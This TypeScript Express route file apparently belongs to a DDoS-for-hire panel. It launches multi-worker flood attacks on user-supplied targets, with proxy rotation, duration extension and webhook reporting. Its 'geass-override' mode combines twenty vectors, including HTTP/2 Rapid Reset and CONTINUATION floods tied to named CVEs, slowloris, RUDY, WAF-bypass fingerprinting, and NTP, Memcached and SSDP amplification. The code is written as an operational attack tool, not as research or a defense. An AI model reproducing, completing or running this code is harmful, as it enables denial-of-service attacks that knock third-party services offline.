/**
 * ATTACKS ROUTE
 *
 * Orchestrates attacks using worker_threads — one worker per CPU core.
 * Each worker runs its own Node.js event loop, dgram UDP sockets, net TCP
 * sockets, and fetch HTTP calls in complete isolation.
 *
 * With 8 CPU cores:
 *   • UDP flood  → 8 × ~200K pkts/s  = ~1.6M pkts/s
 *   • HTTP flood → 8 × ~1200 req/s   = ~9600 req/s
 *   • Geass Ovrd → 8 × triple vector = massive concurrent load
 */
import { Router, type IRouter } from "express";
import { eq, sql, desc } from "drizzle-orm";
import { db, attacksTable } from "@workspace/db";
import { Worker } from "worker_threads";
import os   from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import {
  CreateAttackBody,
  GetAttackParams,
  DeleteAttackParams,
  StopAttackParams,
} from "@workspace/api-zod";
import { proxyCache } from "./proxies.js";

const router: IRouter = Router();

// ── Worker file path (resolved relative to this bundle) ───────────────────
const WORKER_FILE = path.join(
  path.dirname(fileURLToPath(import.meta.url)),
  "attack-worker.mjs",
);

// ── Active attack worker sets ──────────────────────────────────────────────
const attackWorkers = new Map<number, Worker[]>();

// ── Live in-memory connection counter (slowloris + conn-flood) ─────────────
export const attackLiveConns = new Map<number, number>();

// ── CPU count (how many parallel workers to spawn) ────────────────────────
const CPU_COUNT = Math.max(1, os.cpus().length);

// ── Webhook ────────────────────────────────────────────────────────────────
async function fireWebhook(url: string, attack: typeof attacksTable.$inferSelect) {
  try {
    await fetch(url, {
      method: "POST", headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ event: "attack_finished", attack }),
      signal: AbortSignal.timeout(5000),
    });
  } catch { /* silent */ }
}

// ── DB stats accumulator ──────────────────────────────────────────────────
async function addStats(id: number, pkts: number, bytes: number) {
  try {
    await db.update(attacksTable).set({
      packetsSent: sql`${attacksTable.packetsSent} + ${pkts}`,
      bytesSent:   sql`${attacksTable.bytesSent}   + ${bytes}`,
    }).where(eq(attacksTable.id, id));
  } catch { /* ignore */ }
}


// ─────────────────────────────────────────────────────────────────────────
//  SPAWN POOL — spawns numWorkers workers for a single method
// ─────────────────────────────────────────────────────────────────────────
const HTTP_PROXY_METHODS = new Set([
  // L7 HTTP methods — full proxy rotation (HTTP + SOCKS5)
  "http-flood", "http-bypass", "http-pipeline",
  // L7 application-layer attacks — now proxy-aware
  "graphql-dos", "cache-poison", "rudy-v2",
  // TLS/H2 methods — HTTP CONNECT + SOCKS5 tunnel
  "http2-flood", "http2-continuation", "hpack-bomb", "ssl-death", "tls-renego",
  "conn-flood", "ws-flood", "h2-settings-storm", "waf-bypass",
]);

function spawnPool(
  method: string, target: string, port: number, threads: number,
  numWorkers: number, signal: AbortSignal, onStats: (p: number, b: number, c?: number) => void,
): Promise<void> {
  const threadsPerWorker = Math.max(1, Math.floor(threads / numWorkers));
  const workers: Worker[] = [];
  const workerConns = new Array<number>(numWorkers).fill(0);
  // Pass top 150 fastest proxies (HTTP + SOCKS5) to workers for rotation
  const proxies = HTTP_PROXY_METHODS.has(method) && proxyCache.length > 0
    ? proxyCache.slice(0, 150).map(p => ({ host: p.host, port: p.port, type: p.type as "http" | "socks5" | undefined }))
    : [];

  return new Promise<void>((resolve) => {
    const finished = new Set<number>();
    let resolved = false;
    const tryResolve = () => { if (!resolved && finished.size >= numWorkers) { resolved = true; resolve(); } };

    for (let i = 0; i < numWorkers; i++) {
      const t = i === numWorkers - 1
        ? threads - threadsPerWorker * (numWorkers - 1)
        : threadsPerWorker;

      // In dev: cap worker heap to avoid container OOM (prod has 32GB, no limit needed)
      const workerOpts: import("worker_threads").WorkerOptions = {
        workerData: { method, target, port, threads: t, proxies },
        ...(process.env.NODE_ENV !== "production" && {
          resourceLimits: { maxOldGenerationSizeMb: 512 },
        }),
      };
      const w = new Worker(WORKER_FILE, workerOpts);
      const idx = i;
      workers.push(w);

      w.on("message", (msg: { pkts?: number; bytes?: number; done?: boolean; conns?: number }) => {
        if (msg.pkts !== undefined && msg.bytes !== undefined) {
          if (msg.conns !== undefined) workerConns[idx] = msg.conns;
          const totalConns = workerConns.reduce((a, b) => a + b, 0);
          onStats(msg.pkts, msg.bytes, totalConns > 0 ? totalConns : undefined);
        }
        if (msg.done) { finished.add(idx); tryResolve(); }
      });
      w.on("error", () => { finished.add(idx); tryResolve(); });
      w.on("exit",  () => { finished.add(idx); tryResolve(); });
    }

    signal.addEventListener("abort", () => {
      workers.forEach(w => { try { w.postMessage("stop"); } catch { /**/ } });
      setTimeout(() => {
        workers.forEach(w => { try { w.terminate(); } catch { /**/ } });
        if (!resolved) { resolved = true; resolve(); }
      }, 2000);
    }, { once: true });
  });
}

// ─────────────────────────────────────────────────────────────────────────
//  RUN ATTACK — spawns CPU_COUNT workers, each with threads/N load
// ─────────────────────────────────────────────────────────────────────────
async function runAttackWorkers(
  method: string, target: string, port: number, threads: number,
  signal: AbortSignal, onStats: (p: number, b: number, c?: number) => void,
): Promise<void> {
  // UDP/L3 attacks: SINGLE worker with multiple sockets (multi-worker UDP can deadlock in this env)
  // quic-flood is also UDP-based (port 443/UDP)
  // icmp-flood, dns-amp, ntp-amp, mem-amp, ssdp-amp are real network attacks via dgram UDP
  const UDP_METHODS = new Set([
    "udp-flood", "udp-bypass", "quic-flood",
    "icmp-flood", "dns-amp", "ntp-amp", "mem-amp", "ssdp-amp",
  ]);
  if (UDP_METHODS.has(method)) {
    await spawnPool(method, target, port, threads, 1, signal, onStats);
    return;
  }

  // ── GEASS OVERRIDE: VIGINTUS ARES — ABSOLUTE OMNIVECT DEVASTATION ──────
  // Vector  1: Connection Flood        — exhaust nginx worker_connections (pre-HTTP layer)
  // Vector  2: Slowloris               — hold half-open TLS sockets, starve thread pool
  // Vector  3: HTTP/2 Rapid Reset      — CVE-2023-44487: 512-stream RST burst, dominant CPU
  // Vector  4: H2 CONTINUATION Flood   — CVE-2024-27316: server buffers headers → OOM (nginx ≤1.25.4)
  // Vector  5: HPACK Bomb              — RFC 7541 incremental indexing table eviction storm
  // Vector  6: WAF Bypass              — JA3+AKAMAI Chrome fingerprint, evades CF/Akamai
  // Vector  7: WebSocket Exhaustion    — goroutine/thread per conn + large message frames
  // Vector  8: GraphQL Fragment Bomb   — fragment spread explosion: O(frags × fields) CPU
  // Vector  9: RUDY v2 Slow POST       — multipart/form-data 1GB body, holds server threads
  // Vector 10: Cache Poison            — CDN cache eviction, 100% origin miss rate
  // Vector 11: TLS Renegotiation       — forced public-key handshake 1000×/sec on server CPU
  // Vector 12: QUIC/HTTP3 Flood        — RFC 9000 DCID exhaustion, crypto state per packet
  // Vector 13: SSL Death Record        — 1-byte TLS records, 40K AES-GCM decrypts/sec on server
  // Vector 14: H2 Settings Storm       — CVE-2023-44487 variant: SETTINGS oscillation + WINDOW_UPDATE
  // Vector 15: HTTP Pipeline Flood     — HTTP/1.1 pipelining 128 req/write, 300K req/s, keeps TCP alive
  // Vector 16: ICMP Flood              — real ICMP echo request flood, L3 bandwidth saturation
  //                                       (raw-socket Tier 1 / hping3 Tier 2 / UDP saturation Tier 3)
  // Vector 17: DNS Water Torture       — floods target NS servers with random subdomains (bypasses CDN!)
  //                                       forces recursive resolution, fills NXDOMAIN cache, no WAF
  // Vector 18: NTP Flood               — real NTP mode 7 monlist + mode 3 client requests to port 123
  // Vector 19: Memcached UDP Flood     — real binary Memcached protocol to port 11211
  // Vector 20: SSDP M-SEARCH Flood     — real SSDP M-SEARCH to port 1900 (UPnP stack exhaustion)
  //
  // ★ 32GB RAM / 8 vCPU optimized — VIGINTUS: 20 simultaneous real attack vectors.
  // I/O-bound vectors (network + socket) — N > 8 workers is fine, each owns its own event loop.
  // CPU-intensive vectors (H2 RST, TLS Renego RSA, H2 CONTINUATION OOM) get extra workers.
  // UDP/L3 vectors use a single worker with high socket concurrency (no multi-worker UDP lock).
  if (method === "geass-override") {
    const connW   = 2;  // 2×: double connection flood workers for nginx exhaustion
    const slowW   = 2;  // 2×: 2 workers × 50K Slowloris = 100K half-open connections
    const h2W     = Math.max(3, Math.ceil(CPU_COUNT * 0.35));  // ≥3 — CVE-2023-44487 PING+RST dominant
    const contW   = Math.max(3, Math.ceil(CPU_COUNT * 0.25));  // ≥3 — CVE-2024-27316 OOM (16KB frames)
    const hpackW  = Math.max(2, Math.ceil(CPU_COUNT * 0.20));  // ≥2 — HPACK table eviction
    const wafW    = Math.max(2, Math.ceil(CPU_COUNT * 0.20));  // ≥2 — CF/Akamai bypass fingerprint
    const wsW     = 1;
    const gqlW    = 1;
    const rudyW   = 2;  // 2×: multipart + classic RUDY
    const cacheW  = 1;
    const tlsW    = Math.max(2, Math.ceil(CPU_COUNT * 0.15));  // ≥2 — RSA renegotiation is CPU intensive
    const quicW   = 1;  // QUIC/H3 — UDP single worker
    const sslW    = 1;  // SSL Death Record
    const stormW  = Math.max(2, Math.ceil(CPU_COUNT * 0.25));  // ≥2 — H2 Settings Storm
    const pipeW   = Math.max(2, Math.ceil(CPU_COUNT * 0.20));  // ≥2 — HTTP Pipeline 300K req/s per worker
    // L3/UDP vectors — each uses a single worker with high socket concurrency
    const icmpW   = 1;  // ICMP Flood — raw-socket / hping3 / UDP saturation
    const dnsW    = 1;  // DNS Water Torture — floods target NS servers
    const ntpW    = 1;  // NTP Flood — mode 7 monlist + mode 3
    const memW    = 1;  // Memcached UDP flood
    const ssdpW   = 1;  // SSDP M-SEARCH flood

    // Thread budget — 32GB/8vCPU optimized (20-vector VIGINTUS split)
    // Heavy hitters: H2 RST, H2 CONTINUATION, H2 Storm, WAF Bypass, HTTP Pipeline
    const connT   = Math.max(100, Math.round(threads * 0.06));
    const slowT   = Math.max(100, Math.round(threads * 0.06));
    const h2T     = Math.max(300, Math.round(threads * 0.22)); // ★ CVE-2023-44487 dominant
    const contT   = Math.max(200, Math.round(threads * 0.18)); // ★ CVE-2024-27316 OOM
    const hpackT  = Math.max(150, Math.round(threads * 0.12)); // ★ HPACK eviction storm
    const wafT    = Math.max(150, Math.round(threads * 0.15)); // ★ CF/Akamai WAF bypass
    const wsT     = Math.max(80,  Math.round(threads * 0.06));
    const gqlT    = Math.max(50,  Math.round(threads * 0.04));
    const udpT    = Math.max(64,  Math.round(threads * 0.04));
    const rudyT   = Math.max(60,  Math.round(threads * 0.05));
    const cacheT  = Math.max(50,  Math.round(threads * 0.04));
    const tlsT    = Math.max(50,  Math.round(threads * 0.04));
    const quicT   = Math.max(32,  Math.round(threads * 0.03));
    const sslT    = Math.max(60,  Math.round(threads * 0.05));
    const stormT  = Math.max(150, Math.round(threads * 0.18)); // ★ H2 Settings Storm proven
    const pipeT   = Math.max(400, Math.round(threads * 0.25)); // ★ HTTP Pipeline 300K req/s per worker
    // L3/UDP — each gets its own thread pool; single worker uses all threads as socket count
    const icmpT   = Math.max(64,  Math.round(threads * 0.08)); // ICMP: 64 sockets saturates 1Gbps link
    const dnsT    = Math.max(64,  Math.round(threads * 0.06)); // DNS Water Torture: 64 UDP sockets
    const ntpT    = Math.max(64,  Math.round(threads * 0.05)); // NTP mode 7 monlist
    const memT    = Math.max(64,  Math.round(threads * 0.05)); // Memcached binary UDP
    const ssdpT   = Math.max(64,  Math.round(threads * 0.05)); // SSDP M-SEARCH

    const geassConnsPerPool = new Map<string, number>();
    const makeGeassOnStats = (poolKey: string) => (p: number, b: number, c?: number) => {
      if (c !== undefined) {
        geassConnsPerPool.set(poolKey, c);
        const total = [...geassConnsPerPool.values()].reduce((a, v) => a + v, 0);
        onStats(p, b, total);
      } else {
        onStats(p, b);
      }
    };

    await Promise.all([
      spawnPool("conn-flood",         target, port, connT,  connW,  signal, makeGeassOnStats("conn")),
      spawnPool("slowloris",          target, port, slowT,  slowW,  signal, makeGeassOnStats("slow")),
      spawnPool("http2-flood",        target, port, h2T,    h2W,    signal, onStats),
      spawnPool("http2-continuation", target, port, contT,  contW,  signal, onStats),
      spawnPool("hpack-bomb",         target, port, hpackT, hpackW, signal, onStats),
      spawnPool("waf-bypass",         target, port, wafT,   wafW,   signal, onStats),
      spawnPool("ws-flood",           target, port, wsT,    wsW,    signal, makeGeassOnStats("ws")),
      spawnPool("graphql-dos",        target, port, gqlT,   gqlW,   signal, onStats),
      spawnPool("udp-flood",          target, port, udpT,   1,      signal, onStats),
      spawnPool("rudy-v2",            target, port, rudyT,  rudyW,  signal, makeGeassOnStats("rudy")),
      spawnPool("cache-poison",       target, port, cacheT, cacheW, signal, onStats),
      spawnPool("tls-renego",         target, port, tlsT,   tlsW,   signal, makeGeassOnStats("tls")),
      spawnPool("quic-flood",         target, port, quicT,  quicW,  signal, onStats),
      spawnPool("ssl-death",          target, port, sslT,   sslW,   signal, makeGeassOnStats("ssl")),
      spawnPool("h2-settings-storm",  target, port, stormT, stormW, signal, onStats),  // Vector 14
      spawnPool("http-pipeline",      target, port, pipeT,  pipeW,  signal, onStats),  // Vector 15 NEW
      spawnPool("icmp-flood",         target, port, icmpT,  icmpW,  signal, onStats),  // Vector 16
      spawnPool("dns-amp",            target, port, dnsT,   dnsW,   signal, onStats),  // Vector 17
      spawnPool("ntp-amp",            target, port, ntpT,   ntpW,   signal, onStats),  // Vector 18
      spawnPool("mem-amp",            target, port, memT,   memW,   signal, onStats),  // Vector 19
      spawnPool("ssdp-amp",           target, port, ssdpT,  ssdpW,  signal, onStats),  // Vector 20
    ]);
    return;
  }

  // All other real-network methods: single pool of CPU_COUNT workers
  await spawnPool(method, target, port, threads, CPU_COUNT, signal, onStats);
}

// ── Routes ────────────────────────────────────────────────────────────────
router.get("/attacks", async (_req, res): Promise<void> => {
  const attacks = await db.select().from(attacksTable).orderBy(desc(attacksTable.createdAt));
  res.json(attacks);
});

router.post("/attacks", async (req, res): Promise<void> => {
  const p = CreateAttackBody.safeParse(req.body);
  if (!p.success) { res.status(400).json({ error: p.error.message }); return; }
  const { target, port, method, duration, threads, webhookUrl } = p.data;

  const [attack] = await db.insert(attacksTable).values({
    target, port, method, duration, threads,
    status: "running", packetsSent: 0, bytesSent: 0,
    webhookUrl: webhookUrl ?? null,
  }).returning();

  const id   = attack.id;
  const ctrl = new AbortController();
  const stopTimer = setTimeout(() => ctrl.abort("duration_expired"), duration * 1000);

  // Store for manual stop + extend support
  attackAborts.set(id, ctrl);
  attackTimers.set(id, stopTimer);

  void runAttackWorkers(method, target, port, threads, ctrl.signal,
    (pkts, bytes, conns) => {
      void addStats(id, pkts, bytes);
      if (conns !== undefined) attackLiveConns.set(id, conns);
    }
  ).finally(async () => {
    attackLiveConns.delete(id);
    const t = attackTimers.get(id);
    if (t) clearTimeout(t);
    attackTimers.delete(id);
    attackAborts.delete(id);
    try {
      const [cur] = await db.select().from(attacksTable).where(eq(attacksTable.id, id));
      if (cur?.status === "running") {
        const [fin] = await db.update(attacksTable)
          .set({ status: "finished", stoppedAt: new Date() })
          .where(eq(attacksTable.id, id)).returning();
        if (fin?.webhookUrl) await fireWebhook(fin.webhookUrl, fin);
      }
    } catch { /* ignore */ }
  });

  res.status(201).json(attack);
});

// Map for abort controllers + stop timers (for Extend support)
const attackAborts  = new Map<number, AbortController>();
const attackTimers  = new Map<number, ReturnType<typeof setTimeout>>();

router.get("/attacks/stats", async (_req, res): Promise<void> => {
  const attacks = await db.select().from(attacksTable).orderBy(desc(attacksTable.createdAt));
  const methodMap: Record<string, number> = {};
  for (const a of attacks) methodMap[a.method] = (methodMap[a.method] ?? 0) + 1;
  res.json({
    totalAttacks:     attacks.length,
    runningAttacks:   attacks.filter(a => a.status === "running").length,
    totalPacketsSent: attacks.reduce((s, a) => s + (a.packetsSent ?? 0), 0),
    totalBytesSent:   attacks.reduce((s, a) => s + (a.bytesSent   ?? 0), 0),
    attacksByMethod:  Object.entries(methodMap).map(([method, count]) => ({ method, count })),
    recentAttacks:    attacks.slice(0, 10),
    cpuCount:         CPU_COUNT,
  });
});

// Live in-memory stats (active connections) — not stored in DB
router.get("/attacks/:id/live", (req, res): void => {
  const id = parseInt(req.params.id, 10);
  if (isNaN(id)) { res.status(400).json({ error: "Invalid id" }); return; }
  res.json({ conns: attackLiveConns.get(id) ?? 0, running: attackAborts.has(id) });
});

router.get("/attacks/:id", async (req, res): Promise<void> => {
  const p = GetAttackParams.safeParse(req.params);
  if (!p.success) { res.status(400).json({ error: p.error.message }); return; }
  const [a] = await db.select().from(attacksTable).where(eq(attacksTable.id, p.data.id));
  if (!a) { res.status(404).json({ error: "Not found" }); return; }
  res.json(a);
});

router.delete("/attacks/:id", async (req, res): Promise<void> => {
  const p = DeleteAttackParams.safeParse(req.params);
  if (!p.success) { res.status(400).json({ error: p.error.message }); return; }
  const [a] = await db.delete(attacksTable).where(eq(attacksTable.id, p.data.id)).returning();
  if (!a) { res.status(404).json({ error: "Not found" }); return; }
  res.sendStatus(204);
});

// ── Extend running attack by +60s ────────────────────────────────────────
router.patch("/attacks/:id/extend", async (req, res): Promise<void> => {
  const id = parseInt(req.params.id, 10);
  if (isNaN(id)) { res.status(400).json({ error: "Invalid id" }); return; }
  const ctrl = attackAborts.get(id);
  if (!ctrl) { res.status(404).json({ error: "Attack not running" }); return; }
  const addSec = typeof req.body?.seconds === "number" ? Math.min(req.body.seconds, 3600) : 60;

  // Clear old stop timer, arm new one
  const old = attackTimers.get(id);
  if (old) clearTimeout(old);
  const newTimer = setTimeout(() => ctrl.abort("duration_expired"), addSec * 1000);
  attackTimers.set(id, newTimer);

  const [a] = await db.update(attacksTable)
    .set({ duration: sql`${attacksTable.duration} + ${addSec}` })
    .where(eq(attacksTable.id, id)).returning();
  if (!a) { res.status(404).json({ error: "Not found" }); return; }
  res.json({ ok: true, extended: addSec, ...a });
});

router.post("/attacks/:id/stop", async (req, res): Promise<void> => {
  const p = StopAttackParams.safeParse(req.params);
  if (!p.success) { res.status(400).json({ error: p.error.message }); return; }
  const ctrl = attackAborts.get(p.data.id);
  if (ctrl) { ctrl.abort("manual_stop"); attackAborts.delete(p.data.id); }
  const [a] = await db.update(attacksTable)
    .set({ status: "stopped", stoppedAt: new Date() })
    .where(eq(attacksTable.id, p.data.id)).returning();
  if (!a) { res.status(404).json({ error: "Not found" }); return; }
  if (a.webhookUrl) await fireWebhook(a.webhookUrl, a);
  res.json({ ok: true, ...a });
});

export default router;
